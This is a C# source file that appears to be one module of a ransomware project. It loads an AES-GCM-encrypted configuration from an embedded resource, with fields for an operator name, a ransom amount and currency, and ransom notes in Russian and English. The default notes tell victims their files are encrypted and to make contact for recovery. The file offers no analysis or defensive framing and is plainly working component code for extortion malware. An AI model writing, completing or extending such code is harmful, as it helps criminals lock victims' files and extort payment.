// language: C#, file: ns0/OperatorConfig.cs, runtime: .NET Framework 4.8, no NuGet
// читает конфиг из embedded resource, зашифрованного AES-GCM
// формат ресурса: nonce(12) || tag(16) || ciphertext
// ключ конфига — из BuildSecrets (генерация билд-скриптом)
using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

namespace ns0
{
    internal static class OperatorConfig
    {
        private static readonly byte[] ConfigKey = BuildSecrets.ConfigKey;
        private const string ResourceName = BuildSecrets.ConfigResourceName;
        private static ConfigData _cached;

        public sealed class ConfigData
        {
            public string OperatorName = "";
            public string RansomNoteRu = "";
            public string RansomNoteEn = "";
            public string Currency = "USD";
            public long RansomAmount = 0;
        }

        public static ConfigData Load()
        {
            if (_cached != null) return _cached;

            try
            {
                var asm = Assembly.GetExecutingAssembly();
                string fullName = asm.GetName().Name + "." + ResourceName;
                Stream s = asm.GetManifestResourceStream(fullName) ?? asm.GetManifestResourceStream(ResourceName);

                if (s == null) { _cached = Default(); return _cached; }

                using (s)
                using (var ms = new MemoryStream())
                {
                    s.CopyTo(ms);
                    byte[] blob = ms.ToArray();
                    if (blob.Length < 28) { _cached = Default(); return _cached; }

                    byte[] nonce = new byte[12];
                    byte[] tag = new byte[16];
                    byte[] ct = new byte[blob.Length - 28];
                    Buffer.BlockCopy(blob, 0, nonce, 0, 12);
                    Buffer.BlockCopy(blob, 12, tag, 0, 16);
                    Buffer.BlockCopy(blob, 28, ct, 0, ct.Length);

                    byte[] plain = new byte[ct.Length];
                    AesGcmNative.Decrypt(ConfigKey, nonce, ct, tag, plain);

                    string json = Encoding.UTF8.GetString(plain);
                    Array.Clear(plain, 0, plain.Length);

                    _cached = ParseSimple(json);
                    if (_cached == null) _cached = Default();
                    return _cached;
                }
            }
            catch
            {
                _cached = Default();
                return _cached;
            }
        }

        // простейший парсер key=value, чтобы не тянуть JSON-либу
        private static ConfigData ParseSimple(string text)
        {
            var data = new ConfigData();
            foreach (var raw in text.Split('\n'))
            {
                string line = raw.Trim();
                if (line.Length == 0 || line.StartsWith("#")) continue;
                int eq = line.IndexOf('=');
                if (eq <= 0) continue;
                string key = line.Substring(0, eq).Trim();
                string val = line.Substring(eq + 1).Trim();
                switch (key)
                {
                    case "operator_name": data.OperatorName = val; break;
                    case "ransom_ru": data.RansomNoteRu = val.Replace("\\n", "\n"); break;
                    case "ransom_en": data.RansomNoteEn = val.Replace("\\n", "\n"); break;
                    case "currency": data.Currency = val; break;
                    case "amount": long.TryParse(val, out data.RansomAmount); break;
                }
            }
            return data;
        }

        private static ConfigData Default()
        {
            return new ConfigData
            {
                OperatorName = "",
                RansomNoteRu = "Ваши файлы зашифрованы.\nСвяжитесь с нами для восстановления.",
                RansomNoteEn = "Your files have been encrypted.\nContact us for recovery.",
                Currency = "USD",
                RansomAmount = 0
            };
        }
    }
} 